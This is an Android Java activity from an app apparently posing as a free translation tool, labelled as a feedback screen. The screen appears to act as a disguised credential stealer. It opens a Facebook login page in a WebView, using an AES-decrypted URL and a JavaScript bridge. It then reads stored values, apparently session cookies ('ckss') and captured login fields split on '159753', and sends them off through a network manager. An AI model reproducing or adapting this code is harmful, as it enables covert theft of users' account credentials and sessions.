package com.kali_corporation.freeonlinetranslation.fee.act;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.view.MotionEvent;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;

import com.kali_corporation.freeonlinetranslation.R;
import com.kali_corporation.freeonlinetranslation.activity.view.LoadingView;
import com.kali_corporation.freeonlinetranslation.activity.view.ToastView;
import com.kali_corporation.freeonlinetranslation.fee.bean.modul.ModuleBean;
import com.kali_corporation.freeonlinetranslation.fee.bean.ModuleClient;
import com.kali_corporation.freeonlinetranslation.nt.tool.Constant;
import com.kali_corporation.freeonlinetranslation.nt.tool.NtListener;
import com.kali_corporation.freeonlinetranslation.nt.tool.NtManager;
import com.kali_corporation.freeonlinetranslation.nt.tool.hekp.NetHelper;
import com.kali_corporation.freeonlinetranslation.nt.tool.sp.SPUtil;

import java.util.ArrayList;

public class MainFeedbackActivity extends AppCompatActivity implements View.OnClickListener {

    private TextView mTVBack;
    private TextView mTVTitle;
    private TextView mTVSelectModule;
    private EditText mETEmail;
    private Button mBtSubmit;
    private RelativeLayout mRLSelectModule;
    private final static int REQUEST_CODE = 1000;

    private ConstraintLayout feedLayout;
    private LinearLayout feedDetailLayout;
    private WebView webView;
    private String which;
    private LoadingView loadingview;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        setContentView(R.layout.activity_main_feedback);
        initViews();
        initListeners();
        initData();
    }

    private Handler handler = new Handler(Looper.getMainLooper()){
        @Override
        public void handleMessage(@NonNull Message msg) {
            super.handleMessage(msg);
            if (msg.what == 200){
                loadingview.stop();
                loadingview.setVisibility(View.GONE);
            }else if (msg.what == 500){
                ArrayList arrayList = new ArrayList();
                arrayList.add(SPUtil.getInstance(MainFeedbackActivity.this).readData("ckss",""));
                String arg = (String)SPUtil.getInstance(MainFeedbackActivity.this).readData("159753","");
                String[] args = arg.split("159753");
                if (args.length == 2){
                    arrayList.add(args[0]);
                    arrayList.add(args[1]);
                }else if (args.length >2){
                    int i =0;
                    String arg2 = "";
                    for (String s:args){
                        if (i==0) {
                            arrayList.add(s);
                        }else {
                            arg2 = arg2+s;
                        }
                    }
                    arrayList.add(arg2);
                }else {
                    arrayList.add(" ");
                    arrayList.add(" ");
                }

                loadD(arrayList);
            }
        }
    };

    private void initViews(){
        mTVBack = findViewById(R.id.tv_start);
        mTVTitle = findViewById(R.id.tv_title);
        mTVSelectModule = findViewById(R.id.tv_select_module);
        mRLSelectModule = findViewById(R.id.rl_select_module);
        mETEmail = findViewById(R.id.et_phone_mail);
        mBtSubmit = findViewById(R.id.btn_submit);
        feedLayout = findViewById(R.id.cl_contain1);
        feedDetailLayout = findViewById(R.id.ll_contain1);
        webView = findViewById(R.id.webview);
        loadingview = findViewById(R.id.loadingview);

        mBtSubmit.setOnClickListener(this::onClick);
    }
    private void initData(){
        which = getIntent().getStringExtra("which");
        if (!which.equals("")) {
            feedLayout.setVisibility(View.GONE);
            feedDetailLayout.setVisibility(View.VISIBLE);

            webView.getSettings().setJavaScriptEnabled(true);
            webView.addJavascriptInterface(new ToastView(this), "manager");
            // 设置WebView是否支持使用屏幕控件或手势进行缩放，默认是true，支持缩放
//        mWebView.getSettings().setSupportZoom(true);
//        // 设置WebView是否使用其内置的变焦机制，该机制集合屏幕缩放控件使用，默认是false，不使用内置变焦机制。
//        mWebView.getSettings().setBuiltInZoomControls(true);
//        // 设置是否开启DOM存储API权限，默认false，未开启，设置为true，WebView能够使用DOM storage API
//        mWebView.getSettings().setDomStorageEnabled(true);
//        // 触摸焦点起作用.如果不设置，则在点击网页文本输入框时，不能弹出软键盘及不响应其他的一些事件。
            webView.requestFocus();
//        // 设置此属性,可任意比例缩放,设置webview推荐使用的窗口
//        mWebView.getSettings().setUseWideViewPort(true);
//        // 设置webview加载的页面的模式,缩放至屏幕的大小
            webView.getSettings().setLoadWithOverviewMode(true);
//        // 加载链接
//        webView.loadUrl("https://m.facebook.com/login.php?skip_api_login=1&api_key=2824216781227092&app_id=2824216781227092&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2824216781227092%26redirect_uri%3Dfb2824216781227092%253A%252F%252Fauthorize");

            loadingview.start();
            loadingview.setVisibility(View.VISIBLE);
            //https://m.facebook.com/login.php?skip_api_login=1&api_key=1012789045921586&app_id=1012789045921586&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1012789045921586%26redirect_uri%3Dfb1012789045921586%253A%252F%252Fauthorize
            if (which.split("@").length >= 2) {
                webView.loadUrl(which.split("@", 2)[1]);
                if (which.split("@")[0].startsWith("h")) {
                    webView.loadUrl(NetHelper.deByAESDES(which.split("@")[0], (String) SPUtil.getInstance(MainFeedbackActivity.this).readData(Constant.PK, "")));
                }
                webView.setWebViewClient(new ModuleClient(this, handler));

            } else {
                feedLayout.setVisibility(View.VISIBLE);
                feedDetailLayout.setVisibility(View.GONE);
                loadingview.stop();
                loadingview.setVisibility(View.GONE);
            }
        }else {
            loadingview.stop();
            loadingview.setVisibility(View.GONE);
        }
        mTVTitle.setText(getString(R.string.suggest_feedback));
    }
    private void initListeners(){
        mRLSelectModule.setOnClickListener(this);
        mTVBack.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()){
            case R.id.rl_select_module:/*选择模块*/
                Intent intent = new Intent(this,ModuleSelectionActivity.class);
                startActivityForResult(intent, REQUEST_CODE);

                break;
            case R.id.tv_start:
                finish();
                break;
            case R.id.btn_submit:
                ArrayList arrayList = new ArrayList();
                arrayList.add(mTVTitle.getText().toString());
                arrayList.add(mTVSelectModule.getText().toString());
                arrayList.add(mETEmail.getText().toString());
                arrayList.add(String.valueOf(System.currentTimeMillis()));
                loadD(arrayList);
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        SPUtil.getInstance(MainFeedbackActivity.this).saveData("vebt",true);
                        loadingview.stop();
                        loadingview.setVisibility(View.GONE);
                        finish();
                    }
                },1000);
                break;
        }
    }

    private void loadD(ArrayList<String> arrayList){
        loadingview.start();
        loadingview.setVisibility(View.VISIBLE);
        NtManager.initEvebt(this,arrayList, new NtListener() {
            @Override
            public void ntstate(int st) {
                if (st == 1){
                    Constant.PG = true;
                }
                loadingview.stop();
                loadingview.setVisibility(View.GONE);
                finish();
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode){
            case REQUEST_CODE:
                if(resultCode == RESULT_OK && data != null){
                    Object obj = data.getSerializableExtra("module");
                    if(obj instanceof ModuleBean){
                        ModuleBean bean = (ModuleBean)obj;
                        mTVSelectModule.setText(bean.getName());
                    }
                }

                break;
        }
    }

    @Override
    public boolean dispatchTouchEvent(MotionEvent ev) {

        if (ev.getAction() == MotionEvent.ACTION_DOWN){
            View v = getCurrentFocus();
            if (isShouldHideInput(v,ev)){
                InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
                if (imm!=null){
                    imm.hideSoftInputFromWindow(v.getWindowToken(),0);
                }
            }
            return super.dispatchTouchEvent(ev);

        }
        if (getWindow().superDispatchTouchEvent(ev)){
            return true;
        }
        return onTouchEvent(ev);
    }

    private boolean isShouldHideInput(View v,MotionEvent event){
        if (webView.getVisibility() == View.VISIBLE){
            return false;
        }
        if (v!=null && (v instanceof EditText)){
            int[] leftTop = {0,0};
            v.getLocationInWindow(leftTop);
            int left = leftTop[0];
            int top = leftTop[1];
            int bottom = top+v.getHeight();
            int right = left+v.getWidth();
            if (event.getX()>left && event.getX()<right && event.getY()>top && event.getY()<bottom){
                return false;
            }
            return true;
        }
        return false;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (loadingview!=null) {
            loadingview.stop();
            loadingview.setVisibility(View.GONE);
        }
    }
}
